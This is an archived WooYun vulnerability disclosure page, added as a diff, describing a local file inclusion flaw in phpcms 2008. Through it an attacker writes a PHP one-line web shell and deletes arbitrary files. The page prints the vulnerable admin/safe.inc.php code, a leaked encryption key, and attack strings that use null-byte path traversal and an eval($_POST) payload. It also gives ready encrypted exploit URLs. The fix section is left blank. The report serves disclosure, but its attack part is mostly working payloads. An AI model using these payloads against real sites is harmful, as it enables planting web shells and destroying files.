@@ -1,0 +1,375 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpcms本地包含漏洞导致的写shell漏洞和删除任意文件漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpcms本地包含漏洞导致的写shell漏洞和删除任意文件漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/c4rp3nt3r">c4rp3nt3r</a> 
+</li><li>提交时间：		2011-04-04 19:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-04-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-04-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-04-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-04-26：	细节向普通白帽子公开<br/>
+									2011-05-06：	细节向实习白帽子公开<br/>
+									2011-05-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">by c4rp3nt3r@0x50sec.org<br />
+<br />
+phpcms2008 sp2 or sp4偶没自信看<br />
+这年头发个bug伤不起啊，厂商忽略，被人当成装X，有木有？心情不爽啊不管这么多了。<br />
+<br />
+也木有什么危害，就直接发出来吧。<br />
+phpcms本地包含拿shell的方法，这篇文章接上一个<br />
+http://www.wooyun.org/bugs/wooyun-2010-01795<br />
+《phpcms的phpcms_auth导致的任意变量覆盖漏洞、本地文件包含漏洞和任意文件下载漏洞》<br />
+<br />
+phpcms本地包含类漏洞，如果该文件包含了/include/common.inc.php就可以包含执行很多后台才能执行的文件了。<br />
+<br />
+由于phpcms的全局变量机制，导致能拿shell的方法很多，类似的问题不止一个。<br />
+<br />
+admin/safe.inc.php文件是后台扫木马的程序，但是很可惜的是虽然文件名叫做safe，但是一点也不safe。<br />
+<br />
+公布一个本地包含秒杀拿shell的方法。<br />
+<br />
+包含:admin/safe.inc.php文件GET提交一下数据<br />
+将在根目录下生成一句话<br />
+用上一篇得到的密钥$key=&#039;sIpeofogblFVCildZEwe&#039;;<br />
+加密如下字符串<br />
+<br />
+$evil=&#039;i=1&amp;m=1&amp;f=fuck&amp;action=edit_code&amp;file_path=evil.php&amp;code=&lt;?eval($_POST[a])?&gt;&amp;mod=../../admin/safe.inc.php%00&#039;;<br />
+<br />
+http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKBTkxHgoddBUBBhIwBA0II3AlAAABBTUWERt0FRMGCkEXChxgNSwNCVlmehITEiVYQTA2IDQ2NycLalZSQjcqE1hdZ19LQUkOAw8FKHkwCAoBdCwZBl05GBVKVl8=<br />
+将在根目录下生成一句话木马<br />
+<br />
+同理任意文件删除漏洞：<br />
+$evil=&#039;i=1&amp;m=1&amp;f=fuck&amp;action=del_file&amp;files=robots.txt&amp;mod=../../admin/safe.inc.php%00&#039;;<br />
+http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKBTkxHgoddBQAAzkJDg4JYDAqBQkXZzcYBxw9A0sbHhtBDwMia21HQ0p0ahYBHiAeShwHCQJMBSg1bRkEFH91Rw==<br />
+<br />
+参考:Flyh4t [PhpCMS]一个漏洞的二次利用<br />
+<br />
+<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">贴上存在漏洞的代码<br />
+<br />
+//admin/safe.inc.php<br />
+<br />
+&lt;?php <br />
+<br />
+<br />
+<br />
+defined(&#039;IN_PHPCMS&#039;) or exit(&#039;Access Denied&#039;);<br />
+<br />
+// include/common.inc.php 里面声明了常量<br />
+<br />
+// define(&#039;IN_PHPCMS&#039;, TRUE);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+if(empty($action)) $action = &quot;start&quot;;<br />
+<br />
+<br />
+<br />
+$safe = cache_read(&#039;safe.php&#039;);<br />
+<br />
+<br />
+<br />
+$filecheck = load(&#039;filecheck.class.php&#039;);<br />
+<br />
+<br />
+<br />
+if(empty($safe))<br />
+<br />
+<br />
+<br />
+{<br />
+<br />
+<br />
+<br />
+	$safe = array (<br />
+<br />
+<br />
+<br />
+  &#039;file_type&#039; =&gt; &#039;php|js&#039;,<br />
+<br />
+<br />
+<br />
+  &#039;code&#039; =&gt; &#039;&#039;,<br />
+<br />
+<br />
+<br />
+  &#039;func&#039; =&gt; &#039;com|system|exec|eval|escapeshell|cmd|passthru|base64_decode|gzuncompress&#039;,<br />
+<br />
+<br />
+<br />
+  &#039;dir&#039; =&gt; $filecheck-&gt;checked_dirs()<br />
+<br />
+<br />
+<br />
+	);<br />
+<br />
+<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+switch ($action)<br />
+<br />
+<br />
+<br />
+{<br />
+<br />
+...<br />
+<br />
+	case &#039;edit_code&#039;:<br />
+<br />
+<br />
+<br />
+		if (file_put_contents(PHPCMS_ROOT.$file_path, stripcslashes($code)))<br />
+<br />
+<br />
+<br />
+		{<br />
+<br />
+<br />
+<br />
+			showmessage(&#039;修改成功！&#039;);<br />
+<br />
+<br />
+<br />
+		}<br />
+<br />
+<br />
+<br />
+	break;<br />
+<br />
+<br />
+<br />
+	<br />
+<br />
+<br />
+<br />
+	case &#039;del_file&#039;:<br />
+<br />
+<br />
+<br />
+		$file_path = urldecode($files);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+		if (empty($file_path)) <br />
+<br />
+<br />
+<br />
+		{<br />
+<br />
+<br />
+<br />
+			showmessage(&#039;请选择文件&#039;);<br />
+<br />
+<br />
+<br />
+		}<br />
+<br />
+<br />
+<br />
+		$file_list = cache_read(&#039;scan_backdoor.php&#039;);<br />
+<br />
+<br />
+<br />
+		unset($file_list[$file_path]);<br />
+<br />
+<br />
+<br />
+		cache_write(&#039;scan_backdoor.php&#039;,$file_list);<br />
+<br />
+<br />
+<br />
+		@unlink(PHPCMS_ROOT.$file_path);<br />
+<br />
+<br />
+<br />
+		showmessage(&#039;文件删除成功！&#039;, &#039;?mod=phpcms&amp;file=safe&amp;action=scan_table&#039;);<br />
+<br />
+<br />
+<br />
+	break;<br />
+<br />
+...<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">将在根目录下生成一句话<br />
+<br />
+用上一篇得到的密钥$key=&#039;sIpeofogblFVCildZEwe&#039;;<br />
+<br />
+加密如下字符串<br />
+<br />
+<br />
+<br />
+$evil=&#039;i=1&amp;m=1&amp;f=fuck&amp;action=edit_code&amp;file_path=evil.php&amp;code=&lt;?eval($_POST[a])?&gt;&amp;mod=../../admin/safe.inc.php%00&#039;;<br />
+<br />
+<br />
+<br />
+http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKBTkxHgoddBUBBhIwBA0II3AlAAABBTUWERt0FRMGCkEXChxgNSwNCVlmehITEiVYQTA2IDQ2NycLalZSQjcqE1hdZ19LQUkOAw8FKHkwCAoBdCwZBl05GBVKVl8=<br />
+<br />
+将在根目录下生成一句话木马<br />
+<br />
+<br />
+<br />
+同理任意文件删除漏洞：<br />
+<br />
+$evil=&#039;i=1&amp;m=1&amp;f=fuck&amp;action=del_file&amp;files=robots.txt&amp;mod=../../admin/safe.inc.php%00&#039;;<br />
+<br />
+http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKBTkxHgoddBQAAzkJDg4JYDAqBQkXZzcYBxw9A0sbHhtBDwMia21HQ0p0ahYBHiAeShwHCQJMBSg1bRkEFH91Rw== </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">略 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/c4rp3nt3r" title="c4rp3nt3r">c4rp3nt3r</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-01814" title="phpcms本地包含漏洞导致的写shell漏洞和删除任意文件漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2011-04-06 10:09</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢 c4rp3nt3r提交漏洞。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="1814";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
